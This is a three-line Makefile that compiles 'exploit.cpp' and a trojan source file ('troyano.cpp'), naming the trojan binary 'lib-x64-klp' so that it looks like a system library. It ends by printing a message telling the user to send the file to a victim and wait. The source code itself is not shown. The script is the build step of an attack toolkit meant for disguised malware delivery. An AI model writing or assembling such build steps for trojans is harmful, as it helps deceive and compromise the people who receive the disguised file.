all:
	g++ exploit.cpp -o exploit
	g++ troyano.cpp -o lib-x64-klp
	echo "\n[+] You are all set, send lib-x64-klp to your victim and wait... :P";

